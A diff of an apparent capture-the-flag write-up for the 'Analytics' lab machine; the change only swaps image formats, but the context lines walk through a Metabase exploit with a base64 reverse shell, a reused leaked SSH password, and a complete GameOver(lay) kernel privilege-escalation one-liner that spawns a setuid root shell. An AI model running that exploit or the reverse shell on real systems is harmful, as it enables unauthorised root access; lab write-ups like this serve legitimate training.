@@ -8,7 +8,7 @@ math: true
 mermaid: true
 author: 7h3h0und
 image:
-  path: /assets/img/headers/analytics.png
+  path: /assets/img/headers/analytics.webp
   lqip: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhWlDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV9TpUUqDhYUcchQBcGCqBRHrUIRKpRaoVUHk0u/oElDkuLiKLgWHPxYrDq4OOvq4CoIgh8gzg5Oii5S4v+SQosYD4778e7e4+4dIDQqTDW7JgBVs4x0Ii5mc6ti4BV+DCCIGMYkZupzqVQSnuPrHj6+3kV5lve5P0evkjcZ4BOJZ5luWMQbxLFNS+e8TxxmJUkhPiceN+iCxI9cl11+41x0WOCZYSOTnicOE4vFDpY7mJUMlXiaOKKoGuULWZcVzluc1UqNte7JXxjKayvLXKc5jAQWsYQURMiooYwKLERp1Ugxkab9uId/yPGnyCWTqwxGjgVUoUJy/OB/8LtbszA16SaF4kD3i21/jACBXaBZt+3vY9tungD+Z+BKa/urDWDmk/R6W4scAX3bwMV1W5P3gMsdYPBJlwzJkfw0hUIBeD+jb8oB/bdAz5rbW2sfpw9AhrpK3gAHh8BokbLXPd4d7Ozt3zOt/n4AtmZywhxJ/E8AAAM6SURBVHicnZXbbt02EEXXDClROpbjBElQOGmTvPX/P6dF0T4UvSR2mjo+ProNZ/ogJY/1aQkIAgiCs7D3Ho48u/4++B9LdfuLCv0giIItQqyCJkCgakPSBqsGq5HDyUmxcCIFhJD/a2ERiIDxGNQqHAZY5iAlJZaNKhyCoG0aSttintCstOGoCKdlZawVhfMBmiJcDJnDRUs/DFz1mbZREMGqMx8fOC4r41iZRlhnwasxjUYSxQVGB6+2yeMQnKmACHR9ouSGkjouuoGnneAeBErpEulkTDXIIbTFqWsQIahCUkFF8AhEhPAgodSIxwEiIDXQ9ZlWWrqm8PTZwKunwTwFjiJdw/0ycXc0tELTwJKddd7ucAIUPAKPgAisOiJ6ngKqULrMZTvw4vVzXn3/DW9eCvd3GZdEfgLjE2VJHR/eH3mweyQ5EVsW9ppfPxAiNmUfB9h7JGeh9B2pPTCRmbSQ0kvUBbNbLKCUA4dDZR4fUBFEtiICCLLbKfu9AnEOwHaOWoPqwTyv3NzccpkL15fPcZQ/Pn3k7vZvlrkDEQJFVBEN+AIgW3HZiSIcSI8DCFtbrYtj4SzTyvjnyE3NvHjzF5Eynz7c8fFmpI+CC1QXag2CzfcgttTHDhPQNC0Rfp4C1WAcV9arFRrFteXjDL8dVzTDqSakH2i1MN0vWA2qAQoRghNEBLJtgcBwdUGc0wXbeWE6OZ/vj9AWrBPG6ji/k3PmND6ArZzixMN0YpkDD0FUILYwugdpt0DYLDirC1JSSinklGBVtBpXTY8lI8VCcuOggjcJnx28oWkPlFgwM8x8UyECFQHdI7mH8V8BIgIVRVWp1Tndz4gLPhmSK5SRlDPhgtVtFixTbBqrEgLmjoez7krgWxg7hHgM4Muq1TEzIgL3YF4q7gYitE2DJkWzfpXaQ7DYQhhA3R8gj8Al0Ni74DELRASrlWmeeff2O0oplLZlNePb19e8f3/L23fX/Pzrj1wOA1kGrL9kejjyyw8/IUkYbUX398CqsVpwWXoCMFuRc8axiLAsK9Xr1xCZVdrS0uaG0JWmD3Bh9QJNz7O+Z7aFz9NpG93uhDsewZPSc8gtixn/AMVq7JMcOEpfAAAAAElFTkSuQmCC
 ---
 
@@ -44,13 +44,13 @@ I went ahead and browsed the host by pasting in the IP address as we have HTTP s
 
 I swiftly added the host  analytical.htb to /etc/hosts and went back to web application for further enumeration.  
 
-![img-description](/assets/img/htb/analytics/1.png) _analytical.htb_
+![img-description](/assets/img/htb/analytics/1.webp) _analytical.htb_
 
 As we see there is an option that allow login to the web application, upon visiting the page I was redirected to another page  http:///data.analytical.htb/.
 
 To view the page, we need to add the host to our /etc/hosts. 
 
-![img-description](/assets/img/htb/analytics/2.png) _data.analytical.htb_
+![img-description](/assets/img/htb/analytics/2.webp) _data.analytical.htb_
 
 Now, as we have the host entry in place, we can see it is a `metabase` login page.  
 
@@ -71,7 +71,7 @@ Let us dive deep into each method!
 
 As described in PoC we would need to obtain the `setup token` from /api/session/properties.   
 
-![img-description](/assets/img/htb/analytics/3.png) _Setup Token_
+![img-description](/assets/img/htb/analytics/3.webp) _Setup Token_
 
 As we have the setup token, we need to replace it in payload with token value.  
 
@@ -104,11 +104,11 @@ As we have the setup token, we need to replace it in payload with token value.
 
 Now, we needs to encode the reverse shell payload into base64, with your own IP and port, before parsing it.   
 
-![img-description](/assets/img/htb/analytics/4.png) _Complete Payload_
+![img-description](/assets/img/htb/analytics/4.webp) _Complete Payload_
 
 As you can see, we have a reverse shell.  
 
-![img-description](/assets/img/htb/analytics/5.png) _NC - Reverse Shell_
+![img-description](/assets/img/htb/analytics/5.webp) _NC - Reverse Shell_
 
 ### Method 2: Metasploit Module 
 
@@ -223,7 +223,7 @@ MB_DB_FILE=//metabase.db/metabase.db
 ```
 Using the password `An4lytics_ds20223#`, I was able to login to the machine through SSH.
 
-![img-description](/assets/img/htb/analytics/6.png) _SSH: metalytics _
+![img-description](/assets/img/htb/analytics/6.webp) _SSH: metalytics _
 
 We now own the user of the machine!. 
 
@@ -233,11 +233,11 @@ Upon gaining initial access to the Analytical server as the metalytics user, try
 
 However, it gave that we do not have permission to run `sudo `on this machine.  
 
-![img-description](/assets/img/htb/analytics/7.png) _sudo -l_
+![img-description](/assets/img/htb/analytics/7.webp) _sudo -l_
 
 Further I checked if we have any vulnerability related to OS, so I enter the command uname-a to check system information related to Kernel Release Version, OS.   
 
-![img-description](/assets/img/htb/analytics/8.png) _uname -a_
+![img-description](/assets/img/htb/analytics/8.webp) _uname -a_
 Which revealed that the machine is running on `6.2.0-25-generic` kernel version.  With short online research I could find that this version of kernel version is vulnerable to [CVE-2023-2640 and CVE-2023-32629 “GameOver(lay) Ubuntu Privilege Escalation”](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main).
 
 Simply by pasting the payload mentioned in exploit.sh file in machine, we will be elevated to root.
@@ -245,6 +245,6 @@ Simply by pasting the payload mentioned in exploit.sh file in machine, we will b
 ```bash
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 ```
-![img-description](/assets/img/htb/analytics/9.png) _rooted_
+![img-description](/assets/img/htb/analytics/9.webp) _rooted_
 
 We have the machine `ROOTED!`  
